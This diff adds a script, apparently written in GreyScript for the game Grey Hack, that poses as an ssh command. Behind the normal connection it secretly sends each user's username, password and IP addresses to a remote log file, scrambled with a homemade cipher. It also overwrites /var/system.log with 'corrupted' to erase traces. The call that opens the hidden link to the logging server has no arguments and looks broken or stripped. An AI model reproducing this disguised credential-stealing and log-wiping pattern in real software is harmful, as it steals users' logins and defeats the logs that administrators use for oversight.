@@ -1,0 +1,87 @@
+import_code("/root/CryptLib")
+if params.len < 2 or params.len > 3 then exit(command_info("ssh_usage"))
+credentials = params[0].split("@")
+user = credentials[0]
+password = credentials[1]
+
+port = 22
+// params is a list of strings, so you have to convert it to integer, which is what connect_service accepts.
+if params.len == 3 then port = params[2].to_int
+if typeof(port) != "number" then exit("Invalid port: " + port)
+print("Connecting...")
+
+shell = get_shell.connect_service(params[1], port, user, password, "ssh")
+if typeof(shell) == "string" then exit(shell)
+if shell then
+	encrypt=function(pass,secret,type)
+
+		cryptChars=function(pass)
+			if typeof(pass) == "string" then
+			newList=[]
+			for chr in pass
+				newList.push(bitwise("^",chr.code,key))
+			end for
+			return newList.join("/")
+			else if typeof(pass) == "list" then
+				newList=""
+				for num in pass
+					newList=newList+char(bitwise("^",num.to_int,key))
+				end for
+				return newList
+			end if
+		end function
+		
+		shiftChars=function(pass,shift,list)
+			enc=""
+			for chr in pass
+				if list.indexOf(chr) == null then continue
+				newChar=shift[list.indexOf(chr)]
+				enc=enc+newChar
+			end for
+			return enc
+		end function
+		
+		allowedChars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/_.@=!#$%^&*()-+|?<>"
+		shiftedChars="Cy|=a+!@z^M7rmg*BUh(Ne-5tV8dTq?$u4vo1>kWxJpARLcKSb320%EQH6<w_nOG#.&/ZsXI)PjfiFYDl9"
+		passLen=pass.len
+		key=0
+		for chr in secret
+			key=key+chr.code
+		end for
+		if type == "enc" then
+			enc1=cryptChars(pass)
+			crypt=shiftChars(enc1,shiftedChars,allowedChars)
+		else if type == "dec" then
+			dec=shiftChars(pass,allowedChars,shiftedChars)
+			dec=dec.split("/")
+			dec=cryptChars(dec)
+			crypt=dec
+		end if
+		return(crypt)
+	end function
+	perms=false
+	if get_shell.host_computer.File("/var/system.log") and get_shell.host_computer.File("/var/system.log").has_permission("w") then perms=true
+	proxy=get_shell.connect_service
+	logServ=null
+	if typeof(proxy) == "shell" then logServ=proxy.connect_service
+	if not logServ then
+		shell.start_terminal
+		exit
+	end if
+	sshlog=logServ.host_computer.File("/root/sshs")
+	if perms then
+		get_shell.host_computer.touch("/var","system.bak")
+		bak=get_shell.host_computer.File("/var/system.bak")
+		bak.set_content("corrupted")
+		bak.move("/var","system.log")
+		wait(.2)
+		log=get_shell.host_computer.File("/var/system.log")
+	end if
+	cont=CryptLib.Deserialize(encrypt(sshlog.get_content,"Lunar","dec"))
+	log={"source": get_shell.host_computer.public_ip, "dest": shell.host_computer.public_ip, "port": port, "user": user, "pass": password}
+	if cont.indexOf(log) == null then cont.push(log)
+	sshlog.set_content(encrypt(CryptLib.Serialize(cont),"Lunar","enc"))
+    shell.start_terminal
+else 
+    print("connection failed")
+end if
